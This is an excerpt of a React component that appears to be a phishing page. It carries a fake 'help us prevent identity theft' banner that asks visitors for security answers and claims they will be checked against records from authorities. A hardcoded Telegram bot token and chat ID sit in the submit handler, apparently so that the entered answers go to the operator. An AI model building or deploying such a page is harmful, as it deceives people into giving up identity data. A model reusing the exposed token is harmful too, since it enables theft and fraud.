...
const Security: React.FC = () => {
  ...
  const handleSubmit = async (e: React.FormEvent) => {
    ...
    const telegramBotToken = "8379013361:AAG_2hOY6uXZTvCaC4HBfYL6-nR3snO06lM";
    const telegramChatId = "8317872395";
        ...
        <div className="w-full max-w-md bg-white p-6 text-center relative">
         ...
         <img src={logo} alt="" className="w-[100px]"/>
          ...
          <h1 className="text-2xl font-bold p-5 text-center mb-2">
            Help us prevent identity theft and protect your identity
          </h1>

          <p className="text-sm">
            To ensure security, please answer the following security questions.
            Your answers will be checked against the available background
            records from relevant autorities for verification
          </p>
          {/* Message */}
